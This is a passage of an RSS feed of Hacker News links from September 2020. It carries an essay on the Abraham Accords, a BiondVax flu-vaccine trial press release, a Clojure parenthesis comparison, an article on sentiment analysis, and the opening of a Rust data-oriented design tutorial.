<![CDATA[The End of the Arab-Israeli Conflict]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24511291">thread link</a>) | @brandonlc
<br/>
September 17, 2020 | https://ottomansandzionists.com/2020/09/17/the-end-of-the-arab-israeli-conflict/ | <a href="https://web.archive.org/web/*/https://ottomansandzionists.com/2020/09/17/the-end-of-the-arab-israeli-conflict/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

					
						<div>

							
<p>Tuesday’s ceremony on the White House lawn formalizing the normalization of relations between Israel and the United Arab Emirates, along with an agreement for Israel and Bahrain to do the same, marks the end of the Arab-Israeli conflict. The agreements do not create a new Middle East, as some have maintained, but cement that what had arrived haltingly and in fits and starts is here to stay. The Arab-Israeli conflict was already over in practice, and the Abraham Accord put a significant stamp on a process that had been underway for years. This does not lessen that it is something to be celebrated, and it should be clear to everyone without blinders on why Israelis are rightly happy. The Abraham Accord also brings with it another significant consequence, one that is perhaps unintended, in that the end of the Arab-Israeli conflict will put the focus on the Israeli-Palestinian conflict in an unavoidable way.</p>



<p>&nbsp;The Abraham Accord is a positive development for Israel, the UAE, and Bahrain, and nobody should pretend otherwise. Like nearly everything in foreign policy, it will bring some downsides along with it, but that doesn’t alter the cost-benefit analysis. It is a true Jared Kushner accomplishment, and credit should be given where credit is due. While Kushner and the Trump team’s vision for an “ultimate deal” when they took office was clearly intended to be one between Israelis and Palestinians, the decision to recognize Jerusalem as Israel’s capital without any reciprocal gesture toward the Palestinians and – crucially – the Palestinian reaction in the aftermath very obviously shifted their focus. Their vision ultimately became one of isolating and bypassing the Palestinians in order to craft agreements between Israel and Arab states and demonstrate to the Palestinians that they would not be able to exercise a veto over Israel’s place in the region writ large. Whether you agree with this approach or not – and previous administrations did not – the Trump administration succeeded in carrying it out.&nbsp;</p>



<p>&nbsp;While the way to the agreement was paved by the UAE publicly setting forth that normalization could not coexist with annexation, the text of the agreement itself demonstrates how well the Trump administration managed to divorce the Palestinian issue from the wider regional context. The agreement does not explicitly mention the Arab Peace Initiative or the 1967 lines, does not mention annexation, does not mention two states, does not mention past UN agreements, does not mention the Palestinians themselves, and the only reference to the conflict is an open-ended commitment to “realize a negotiated solution to” it “that meets the legitimate needs and aspirations of both people, and to advance comprehensive Middle East peace, stability and prosperity.” For anyone looking to demonstrate to the Palestinians just how little they matter in this new reality, you could not come up with a clearer statement of just that.</p>



<p>&nbsp;That Israel and Arab states have been moving closer together for years due to a confluence of shared interests and a desire to benefit economically, militarily, and technologically does not mean that Kushner’s success was accidental. He was able to come up with the right set of incentives for the UAE to formalize what had been informal, and was also able to make the case that any concerns about breaking the Arab Peace Initiative approach – no normalization before an agreement with the Palestinians – would not carry any real consequences for states willing to do so. For all of the years of talk about secret relations underneath the table, things are now out in the open, and that is indeed a big deal.</p>



<p>&nbsp;But just as it is hollow to argue that the Israel-UAE deal does not matter, it is also hollow to argue that it is the only thing that matters. In the past few weeks, there has been a strange phenomenon of simultaneously embarking on a new path while turning back the clock. In the decades after Israel’s founding, its battles for survival and struggle for acceptance were collectively known as the Arab-Israeli conflict, which accurately reflected the primary threats and challenges that Israel faced. Following repeated Israeli military victories against Egypt, Syria, Jordan, and others, and the subsequent acknowledgement of Israeli military superiority and permanence in the region, the Arab-Israeli conflict transformed into the Israeli-Palestinian conflict. That conflict remains, yet many this week want to pretend that we are back in Arab-Israeli conflict territory. Acting as if peace between Israel and Gulf states, and only peace between Israel and Gulf states, was the terminal goal all along is absurd. It does not detract from the actual accomplishment to describe it accurately and put it in the wider context, or to point out that this is an important and consequential deal but not the ultimate one that President Trump initially sought.</p>



<p>&nbsp;The fact that the Israeli-Palestinian conflict is what remains means that there will be a true return to it in a more crystallized and concentrated way. For some, that will make it even easier to ignore, because left on its own and severed from the prospect of it being the gateway to normal relations with other states, it will seem even less important and relevant. For others, it will mean even greater awareness, as it will be easier to see all of the ways in which it is different from past Israeli conflicts and how it is not going to disappear one day on its own. Whether or not one wants to minimize the Israeli-Palestinian conflict’s importance, it is far harder in the wake of the Israel-UAE accord – one that does not explicitly recognize Israel as a Jewish state but does explicitly recognize Jews’ place in the region and rebuts the charge that Israeli Jews are colonialist interlopers – to maintain the posture that “they will always hate Jews and never accept Israel” and thus no deal can ever be struck. And if you argue that there is something qualitatively different about the Palestinians, it is also harder to simultaneously insist that they are not a distinct nationality and that they should be satisfied going to one of twenty two other Arab countries.</p>



<p>&nbsp;Most saliently, leaving the Arab-Israeli conflict behind while the Israeli-Palestinian conflict remains will create an ever starker contrast between a situation where Israeli actions and control do not have a direct impact on the parties across the table – such as the Emiratis and the Bahrainis – and the glaring situation with the Palestinians, where they do. This is also a Trump administration accomplishment, albeit an unintended one. When Arab states that were not directly impacted by Israeli actions in the West Bank would not engage with Israel, it was easy to criticize and point out the unfair standard involved and lump everyone together. With the Palestinians standing alone in every way, not only in how they relate to Israel but in how Israel relates to them, it is going to be ever clearer why and how the Israeli-Palestinian conflict is not the same as the Arab-Israeli conflict, why and how it cannot be reduced to economic or security interests, and why and how the Palestinians are not going to be overcome by U.S. inducements or the promise of access to Israeli benefits quite so easily.</p>
			
			
			
							
						</div>

					
					

				</div></div>]]>
            </description>
            <link>https://ottomansandzionists.com/2020/09/17/the-end-of-the-arab-israeli-conflict/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24511291</guid>
            <pubDate>Thu, 17 Sep 2020 23:41:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Universal flu vaccine finishes Phase 3 trial, results expected before December]]>
            </title>
            <description>
<![CDATA[
Score 47 | Comments 5 (<a href="https://news.ycombinator.com/item?id=24510293">thread link</a>) | @apsec112
<br/>
September 17, 2020 | https://www.biondvax.com/2020/07/last-of-12400-participants-completes-final-visit-in-biondvaxs-m-001-universal-flu-vaccine-pivotal-phase-3-clinical-trial/ | <a href="https://web.archive.org/web/*/https://www.biondvax.com/2020/07/last-of-12400-participants-completes-final-visit-in-biondvaxs-m-001-universal-flu-vaccine-pivotal-phase-3-clinical-trial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<p>Jerusalem, Israel – July 1, 2020 – <strong>BiondVax Pharmaceuticals Ltd. (Nasdaq: BVXV)</strong> today announced that all participants in the placebo-controlled, blinded, pivotal, clinical efficacy, Phase 3 trial of BiondVax’s M‑001 universal influenza vaccine candidate have now completed their site visits. In total, over 12,400 volunteers aged 50+ (with half aged 65+) were enrolled in the trial over the past two flu seasons in 83 sites across seven European countries. The purpose of the study is to assess M-001’s ability as a standalone non-adjuvanted vaccine to provide clinical protection from circulating influenza strains as measured by reduction of influenza illness rate (as a primary endpoint) and severity (as a secondary endpoint), as well as to assess M-001’s safety.</p>
<p>Seasonal influenza annually infects approximately <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC5596521/">10-20% of the world’s population</a> resulting in up to about <a href="https://www.who.int/en/news-room/fact-sheets/detail/influenza-(seasonal)">five million cases of severe illness and 650,000 deaths</a>. In addition, pandemic influenza, such as the H1N1 Swine Flu pandemic of 2009, is a constant global threat. However, current influenza vaccines, which target frequently mutating parts of the flu virus and therefore must be updated annually in the hope they will match the next flu season’s circulating strains, achieve on average only about <a href="https://www.cdc.gov/flu/vaccines-work/effectiveness-studies.htm">40% vaccine effectiveness</a> in the general population and as low as <a href="https://www.cdc.gov/flu/vaccines-work/2018-2019.html">12% in older adults</a>.</p>
<p>BiondVax’s M-001 is a single recombinant protein of highly conserved influenza epitopes. Consequently:</p>
<ul>
<li>M-001 does not need to be updated and therefore can be manufactured and distributed year-round.</li>
<li>M-001 is designed to provide protection to both existing and future seasonal A and B strains, as well as emerging pandemic strains.</li>
</ul>
<p><a href="http://www.biondvax.com/about-us/management/tamar-ben-yedidia-cso/"><strong>Dr. Tamar Ben-Yedida</strong></a>, BiondVax’s Chief Scientist, commented, “<em>We are pleased that despite the ongoing COVID-19 pandemic, and the challenge of conducting the trial across 83 sites and seven countries, thanks to all the people involved – including the CRO, investigators, and thousands of participants – we have maintained the planned timelines of our pivotal Phase 3 trial. In light of the ongoing COVID-19 pandemic, the need for improved influenza vaccines has arguably never been clearer. To better protect lives and economies, influenza vaccines must be more effective in reducing illness rates and severity. Needless to say, we are eagerly anticipating results of our trial by the end of this year.</em>”</p>
<p>Participants in the trial’s second cohort were enrolled prior to the 2019/20 flu season and monitored for influenza-like illness (ILI) symptoms throughout the flu season. Swabs samples were collected from those participants with ILI, and influenza confirmation is currently being conducted by a qualified laboratory. Analysis will continue in the coming months, and results are expected by the end of 2020.</p>
<p>As part of this Phase 3 study, cell-mediated immunogenicity markers of M-001 will be evaluated in a subset of participants. The recently completed clinical study report (CSR) of a U.S. National Institute of Allergy and Infectious Diseases (NIAID) supported Phase 2 clinical trial of M-001 concluded that, “<em><a href="http://www.biondvax.com/2020/06/nih-report-on-phase-2-clinical-trial-of-biondvaxs-m-001-universal-influenza-vaccine-candidate-concludes-both-primary-endpoints-achieved/">M-001 induced significant polyfunctional T cell responses</a>.</em>”</p>
<p>In addition to the ongoing pivotal, clinical efficacy, Phase 3 trial, equipment installation and manufacturing process scale-up in BiondVax’s pilot facility in Jerusalem are in progress. The facility has planned annual capacity of up to between 10 and 20 million doses in bulk.</p>
<p><strong>About BiondVax </strong><br>
BiondVax (NASDAQ: BVXV) is a Phase 3 clinical stage biopharmaceutical company developing a universal flu vaccine. The vaccine candidate, called M-001, is designed to provide multi-strain and multi-season protection against current and future, seasonal and pandemic influenza. BiondVax’s proprietary technology utilizes a unique combination of conserved and common influenza virus peptides intended to stimulate both arms of the immune system for a cross-protecting and long-lasting effect. In a total of seven completed Phase 1/2 and Phase 2 clinical trials enrolling 818 participants, the vaccine has been shown to be safe, well-tolerated, and immunogenic. The ongoing pivotal Phase 3 clinical trial aims to assess safety and effectiveness of M-001 in reducing flu illness and severity. For more information, please visit <a href="http://www.biondvax.com/">www.biondvax.com</a>.</p>
<p><strong>Contact Details</strong><br>
Joshua E. Phillipson<strong> | </strong>+972 8 930 2529<strong> | </strong>j.phillipson@biondvax.com</p>
<p><strong>Forward Looking Statements</strong><br>
<em>This press release contains forward-looking statements within the meaning of the Private Litigation Reform Act of 1995. Words such as “expect,” “believe,” “intend,” “plan,” “continue,” “may,” “will,” “anticipate,” and similar expressions are intended to identify forward-looking statements. These forward-looking statements reflect the management’s current views with respect to certain current and future events and are subject to various risks, uncertainties and assumptions that could cause the results to differ materially from those expected by the management of BiondVax Pharmaceuticals Ltd. Risks and uncertainties include, but are not limited to, risks relating to the COVID-19 (coronavirus) pandemic, including a risk of delay in the availability of the top line results from our pivotal clinical efficacy Phase 3 trial for M-001, the prosecution, timing and results of the ongoing Phase 2 and Phase 3 trials and any subsequent trials; timing of receipt of regulatory approval of our manufacturing facility in Jerusalem; ability to demonstrate the efficacy and safety of the vaccine; the timing of clinical trials and marketing approvals; the risk that drug development involves a lengthy and expensive process with uncertain outcome; the ability of the Company to maintain, preserve and defend its intellectual property and patents granted; whether our&nbsp; vaccine candidate will successfully advance through the clinical trial process on a timely basis, or at all, and receive approval from the U.S. Food and Drug Administration or equivalent foreign regulatory agencies; the adequacy of available cash resources and the ability to raise additional capital when needed. More detailed information about the risks and uncertainties affecting the Company is contained under the heading “Risk Factors” in our Annual Report on Form 20-F for the year ended December 31, 2019 filed with the U.S. Securities and Exchange Commission, or SEC, which is available on the SEC’s website, www.sec.gov. We undertake no obligation to revise or update any forward-looking statement for any reason.</em></p>
<p>###</p>
							</div></div>]]>
            </description>
            <link>https://www.biondvax.com/2020/07/last-of-12400-participants-completes-final-visit-in-biondvaxs-m-001-universal-flu-vaccine-pivotal-phase-3-clinical-trial/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24510293</guid>
            <pubDate>Thu, 17 Sep 2020 21:41:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Deep Learning in Clojure with Fewer Parentheses Than Keras and Python]]>
            </title>
            <description>
<![CDATA[
Score 8 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24509374">thread link</a>) | @dragandj
<br/>
September 17, 2020 | https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras | <a href="https://web.archive.org/web/*/https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="text-org5455e07">
<p>
How about the number of dreaded parentheses, <code>(</code> and <code>)</code>?
</p>

<table>


<colgroup>
<col>

<col>

<col>
</colgroup>
<thead>
<tr>
<th scope="col">&nbsp;</th>
<th scope="col">Python</th>
<th scope="col">Clojure</th>
</tr>
</thead>
<tbody>
<tr>
<td>( and )</td>
<td>48</td>
<td>28</td>
</tr>

<tr>
<td>(, ), [, and ]</td>
<td>50</td>
<td>48</td>
</tr>

<tr>
<td>Grouped (())</td>
<td>8</td>
<td>2</td>
</tr>

<tr>
<td>)))</td>
<td>2</td>
<td>1</td>
</tr>

<tr>
<td>,</td>
<td>17</td>
<td>0</td>
</tr>

<tr>
<td>model.add</td>
<td>8</td>
<td>0</td>
</tr>
</tbody>
</table>

<p>
As we can see from the table, on every punctuation metric that I could think
of, Deep Diamond and Clojure fare better than Keras &amp; Python.
</p>

<p>
Keras uses almost twice as much parentheses than Deep Diamond. Clojure uses <code>[]</code>
for vector literals, which Deep Diamond uses as tensor shapes. You will note that
there are more than a few of these, and argue that these are parentheses, too.
Fine. Add them up, and Clojure fares slightly better than Python!
</p>

<p>
A parenthesis here and there is not a problem, but there are horror tales of
<code>(((((((</code> and <code>)))))))</code> in Lisps. Not in Clojure. See that there is not a
single <code>((</code> in the Clojure example, and only two occurances of <code>))</code>.
In Python - there are 8.
</p>

<p>
Then we come to all additional assorted punctuation in Python: commas, dots, etc.
In Clojure, there are none, while in Python there are dozens.
</p>

<p>
Python is also riddled with redundant stuff such as <code>model.add()</code>.
</p>

<p>
Etc., etc. You get my point.
</p>
</div></div>]]>
            </description>
            <link>https://dragan.rocks/articles/20/Deep-Diamond-Deep-Learning-in-Clojure-Fewer-Parentheses-Python-Keras</link>
            <guid isPermaLink="false">hacker-news-small-sites-24509374</guid>
            <pubDate>Thu, 17 Sep 2020 20:11:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Algorithms discern our mood from what we write online]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 4 (<a href="https://news.ycombinator.com/item?id=24508610">thread link</a>) | @sinapticasblog
<br/>
September 17, 2020 | https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/ | <a href="https://web.archive.org/web/*/https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Researchers&nbsp;and companies are harnessing computers to identify the emotions behind our written words. While sentiment analysis is far from perfect, it manages to distill meaning from huge amounts of data — and could one day even monitor mental health.</p>



<p>By Dana Mackenzie</p>



<p>9.14.2020</p>



<p>Many people have declared 2020 the worst year ever. While such a description may seem hopelessly subjective, according to one measure, it’s true.</p>



<p>That yardstick is the Hedonometer, a computerized way of assessing both our happiness and our despair. It runs day in and day out on computers at the University of Vermont (UVM), where it scrapes some 50 million tweets per day off Twitter and then gives a quick-and-dirty read of the public’s mood. According to the Hedonometer, 2020 has been by far the most horrible year since it began keeping track in 2008.</p>



<p>The <a rel="noreferrer noopener" href="http://hedonometer.org/timeseries/en_all/" target="_blank">Hedonometer</a> is a relatively recent incarnation of a task computer scientists have been working on for more than 50 years: using computers to assess words’ emotional tone. To build the Hedonometer, UVM computer scientist Chris Danforth had to teach a machine to understand the emotions behind those tweets — no human could possibly read them all. This process, called sentiment analysis, has made major advances in recent years and is finding more and more uses.</p>



<div><figure><img loading="lazy" data-attachment-id="2008" data-permalink="https://sinapticas.com/g-hedonometer/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png" data-orig-size="1179,600" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="g-hedonometer" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=300" data-large-file="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=672" src="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=1024" alt="" width="720" height="366" srcset="https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=1024 1024w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=720 720w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=150 150w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=300 300w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png?w=768 768w, https://sinapticas.files.wordpress.com/2020/09/g-hedonometer.png 1179w" sizes="(max-width: 720px) 100vw, 720px"><figcaption>The Hedonometer tracks the sentiments expressed in tweets, an effort underway since late 2008. This screenshot shows data from mid-August 2019 to the present and reveals a record low in early March of this year coinciding with the Covid-19 pandemic going global; that record was shattered in May after George Floyd’s killing. Portion of scale shown at right goes from 1 (extremely negative) to 9 (extremely positive). Gray at bottom shows total volume of Twitter posts.<br>CREDIT: COMPUTATIONAL STORY LAB AT THE UNIVERSITY OF VERMONT</figcaption></figure></div>



<p>In addition to taking Twitter user’s emotional temperature, researchers are employing sentiment analysis to gauge people’s perceptions of climate change and to test conventional wisdom such as, in music, whether a minor chord is sadder than a major chord (and by how much). Businesses who covet information about customers’ feelings are harnessing sentiment analysis to assess reviews on platforms like Yelp. Some are using it to measure employees’ moods on the internal social networks at work. The technique might also have medical applications, such as identifying depressed people in need of help.</p>



<p>Sentiment analysis is allowing researchers to examine a deluge of data that was previously time-consuming and difficult to collect, let alone study, says Danforth. “In social science we tend to measure things that are easy, like gross domestic product. Happiness is an important thing that is hard to measure.”</p>



<h2>Deconstructing the ‘word stew’</h2>



<p>You might think the first step in sentiment analysis would be teaching the computer to understand what humans are saying. But that’s one thing that computer scientists cannot do; understanding language is one of the most notoriously difficult problems in artificial intelligence. Yet there are abundant clues to the emotions behind a written text, which computers can recognize even without understanding the meaning of the words.</p>



<p>The earliest approach to sentiment analysis is word-counting. The idea is simple enough: Count the number of positive words and subtract the number of negative words. An even better measure can be obtained by weighting words: “Excellent,” for example, conveys a stronger sentiment than “good.” These weights are typically assigned by human experts and are part of creating the word-to-emotion dictionaries, called lexicons, that sentiment analyses often use.</p>



<p>But word-counting has inherent problems. One is that it ignores word order, treating a sentence as a sort of word stew. And word-counting can miss context-specific cues. Consider this product review: “I’m so happy that my iPhone is nothing like my old ugly Droid.” The sentence has three negative words (“nothing,” “old,” “ugly”) and only one positive (“happy”). While a human recognizes immediately that “old” and “ugly” refer to a different phone, to the computer, it looks negative. And comparisons present additional difficulties: What does “nothing like” mean? Does it mean the speaker is <em>not</em> comparing the iPhone with the Android? The English language can be so confusing.</p>



<p>To address such issues, computer scientists have increasingly turned to more sophisticated approaches that take humans out of the loop entirely. They are using machine learning algorithms that teach a computer program to recognize patterns, such as meaningful relationships between words. For example, the computer can learn that pairs of words such as “bank” and “river” often occur together. These associations can give clues to meaning or to sentiment. If “bank” and “money” are in the same sentence, it is probably a different kind of bank.</p>



<div><figure><img data-attachment-id="2010" data-permalink="https://sinapticas.com/captura-de-pantalla-2020-09-17-a-las-15-44-31/" data-orig-file="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png" data-orig-size="577,396" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="captura-de-pantalla-2020-09-17-a-las-15.44.31" data-image-description="" data-medium-file="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=300" data-large-file="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=577" src="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=577" alt="" srcset="https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png 577w, https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=150 150w, https://sinapticas.files.wordpress.com/2020/09/captura-de-pantalla-2020-09-17-a-las-15.44.31.png?w=300 300w" sizes="(max-width: 577px) 100vw, 577px"><figcaption>A computer using a shallow neural network can easily be trained for the task of next-word prediction — a familiar example is the suggested words featured while typing on a smartphone. Here, a neural network-trained language model calculates the probability that various words will follow “Thou shalt.” Once the network is fully trained, it can be reverse-engineered to generate the mathematical constructs called “word embeddings,” which link words that tend to go together. These, in turn, are used as an input to more difficult language-processing tasks, including sentiment analysis.</figcaption></figure></div>



<p>A major step in such methods came in 2013, when Tomas Mikolov of Google Brain applied machine learning to construct a tool called word embeddings. These convert each word into a list of 50 to 300 numbers, called a vector. The numbers are like a fingerprint that <a href="https://jalammar.github.io/illustrated-word2vec/" target="_blank" rel="noreferrer noopener">describes a word</a>, and particularly the other words it tends to hang out with.</p>



<p>To obtain these descriptors, Mikolov’s program looked at millions of words in newspaper articles and tried to predict the next word of text, given the previous words. Mikolov’s embeddings recognize synonyms: Words like “money” and “cash” have very similar vectors. More subtly, word embeddings capture elementary analogies — that king is to queen as boy is to girl, for example — even though it cannot define those words (a remarkable feat given that such analogies were part of how SAT exams assessed performance).</p>



<p>Mikolov’s word embeddings were generated by what’s called a neural network with one hidden layer. Neural networks, which are loosely modeled on the human brain, have <a href="https://www.knowablemagazine.org/article/technology/2020/why-some-artificial-intelligence-smart-until-its-dumb" target="_blank" rel="noreferrer noopener">enabled stunning advances in machine learning</a>, including AlphaGo (which learned to play the game of Go better than the world champion). Mikolov’s network was a deliberately shallower network, so it could be a useful for a variety of tasks, such as translation and topic analysis.</p>



<p><a href="https://www.knowablemagazine.org/article/technology/2020/synthetic-media-real-trouble-deepfakes" target="_blank" rel="noreferrer noopener">Deeper neural networks</a>, with more layers of “cortex,” can extract even more information about a word’s sentiment in the context of a particular sentence or document. A common reference task is for the computer to read a movie review on the Internet Movie Database and predict whether the reviewer gave it a thumbs up or thumbs down. The earliest lexicon methods achieved about 74 percent accuracy. The most sophisticated ones got up to 87 percent. The very first neural nets, in 2011, scored 89 percent. Today they perform with upwards of 94 percent accuracy — approaching that of a human. (Humor and sarcasm remain big stumbling blocks, because the written words may literally express the opposite of the intended sentiment.)</p>



<p><a href="https://www.knowablemagazine.org/collection/coronavirus-0" target="_blank" rel="noreferrer noopener">Explore&nbsp;<em>Knowable</em>’s coronavirus coverage</a></p>



<p>Despite the benefits of neural networks, lexicon-based methods are still popular; the Hedonometer, for instance, uses a lexicon, and Danforth has no intention to change it. While neural nets may be more accurate for some problems, they come at a cost. The training period alone is one of the most computationally intensive tasks you can ask a computer to do.</p>



<p>“Basically, you’re limited by how much electricity you have,” says the Wharton School’s Robert Stine, who covers the <a href="https://www.annualreviews.org/doi/10.1146/annurev-statistics-030718-105242" target="_blank" rel="noreferrer noopener">evolution of sentiment analysis</a> in the 2019 <em>Annual Review of Statistics and Its Application</em>. “How much electricity did Google use to train AlphaGo? The joke I heard was, enough to boil the ocean,” Stine says.</p>



<p>In addition to the electricity needs, neural nets require expensive hardware and technical expertise, and there’s a lack of transparency because the computer is figuring out how to tackle the task, rather than following a programmer’s explicit instructions. “It’s easier to fix errors with a lexicon,” says Bing Liu of the University of Illinois at Chicago, one of the pioneers of sentiment analysis.</p>



<h2>Measuring mental health</h2>



<p>While sentiment analysis often falls under the purview of computer scientists, it has <a href="https://www.cs.cmu.edu/~ylataus/files/TausczikPennebaker2010.pdf" target="_blank" rel="noreferrer noopener">deep roots in psychology</a>. In 1962, Harvard psychologist Philip Stone developed the General Inquirer, the first computerized general purpose text analysis program for use in psychology; in the 1990s, social psychologist James Pennebaker developed an early program for sentiment analysis (the Linguistic Inquiry and Word Count) as a view into people’s psychological worlds. These earlier assessments revealed and confirmed patterns that experts had long-observed: Patients diagnosed with depression had distinct <a href="https://journals.sagepub.com/doi/abs/10.1177/0261927x09351676" target="_blank" rel="noreferrer noopener">writing styles</a>, such as using pronouns “I” and “me” more often. They used more words with negative affect, and sometimes more death-related words.</p>



<p>Researchers are now probing mental health’s expression in speech and writing by <a rel="noreferrer noopener" href="https://www.annualreviews.org/doi/full/10.1146/annurev-biodatasci-030320-040844" target="_blank">analyzing social media posts</a>. Danforth and Harvard psychologist Andrew Reece, for example, analyzed the Twitter posts of people with formal diagnoses of depression or post-traumatic stress disorder that were written <em>prior</em> to the diagnosis (with consent of participants). <a rel="noreferrer noopener" href="https://www.nature.com/articles/s41598-017-12961-9" target="_blank">Signs of depression began to appear</a> as many as nine months earlier. And Facebook has an algorithm to detect users who seem to be at risk of suicide; human experts …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/">https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/</a></em></p>]]>
            </description>
            <link>https://sinapticas.com/2020/09/17/how-algorithms-discern-our-mood-from-what-we-write-online/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24508610</guid>
            <pubDate>Thu, 17 Sep 2020 19:03:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Marker – open source hand-drawn illustrations]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 8 (<a href="https://news.ycombinator.com/item?id=24507433">thread link</a>) | @alokepillai
<br/>
September 17, 2020 | https://usepastel.com/marker-illustrations | <a href="https://web.archive.org/web/*/https://usepastel.com/marker-illustrations">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://usepastel.com/marker-illustrations</link>
            <guid isPermaLink="false">hacker-news-small-sites-24507433</guid>
            <pubDate>Thu, 17 Sep 2020 17:29:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[An Introduction to Data Oriented Design with Rust]]>
            </title>
            <description>
<![CDATA[
Score 412 | Comments 156 (<a href="https://news.ycombinator.com/item?id=24506744">thread link</a>) | @headalgorithm
<br/>
September 17, 2020 | https://jamesmcm.github.io/blog/2020/07/25/intro-dod/ | <a href="https://web.archive.org/web/*/https://jamesmcm.github.io/blog/2020/07/25/intro-dod/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>In the post we will investigate the main concepts of <a href="https://en.wikipedia.org/wiki/Data-oriented_design">Data-oriented
Design</a> using Rust.</p>

<p>The source code for this example is <a href="https://github.com/jamesmcm/data-oriented-example">available on Github</a>.</p>

<!--more-->

<h2 id="what-is-data-oriented-design">What is data-oriented design?</h2>

<p>Data-oriented design is an approach to optimising programs by carefully
considering the memory layout of data structures, and their implications
for auto-vectorisation and use of the CPU cache. I highly recommend
watching Mike Acton’s <a href="https://www.youtube.com/watch?v=rX0ItVEVjHc">“Data-Oriented Design and C++”</a> talk
if you haven’t seen it already.</p>

<p>In this post we will cover 4 cases, using <a href="https://docs.rs/criterion/0.3.3/criterion/">criterion</a> for
benchmarking. The cases are:</p>

<ul>
  <li>Struct of arrays vs. array of structs</li>
  <li>The cost of branching inside a hot loop</li>
  <li>Linked List vs. Vector iteration</li>
  <li>The cost of dynamic dispatch vs. monomorphisation</li>
</ul>

<h2 id="struct-of-arrays-vs-array-of-structs">Struct of Arrays vs. Array of Structs</h2>

<p>The <a href="https://en.wikipedia.org/wiki/AoS_and_SoA">Struct of Arrays vs. Array of Structs</a> 
refers to two contrasting ways of organising entity data to be operated
over.</p>

<p>For example, imagine we are writing a video game and we would like to
have a Player struct with the following fields:</p>

<div><div><pre><code><span>pub</span> <span>struct</span> <span>Player</span> <span>{</span>
    <span>name</span><span>:</span> <span>String</span><span>,</span>
    <span>health</span><span>:</span> <span>f64</span><span>,</span>
    <span>location</span><span>:</span> <span>(</span><span>f64</span><span>,</span> <span>f64</span><span>),</span>
    <span>velocity</span><span>:</span> <span>(</span><span>f64</span><span>,</span> <span>f64</span><span>),</span>
    <span>acceleration</span><span>:</span> <span>(</span><span>f64</span><span>,</span> <span>f64</span><span>),</span>
<span>}</span>
</code></pre></div></div>

<p>Then at each frame, we want to update the locations and velocities of all
Players. We could write something like:</p>

<div><div><pre><code><span>pub</span> <span>fn</span> <span>run_oop</span><span>(</span><span>players</span><span>:</span> <span>&amp;</span><span>mut</span> <span>Vec</span><span>&lt;</span><span>Player</span><span>&gt;</span><span>)</span> <span>{</span>
    <span>for</span> <span>player</span> <span>in</span> <span>players</span><span>.iter_mut</span><span>()</span> <span>{</span>
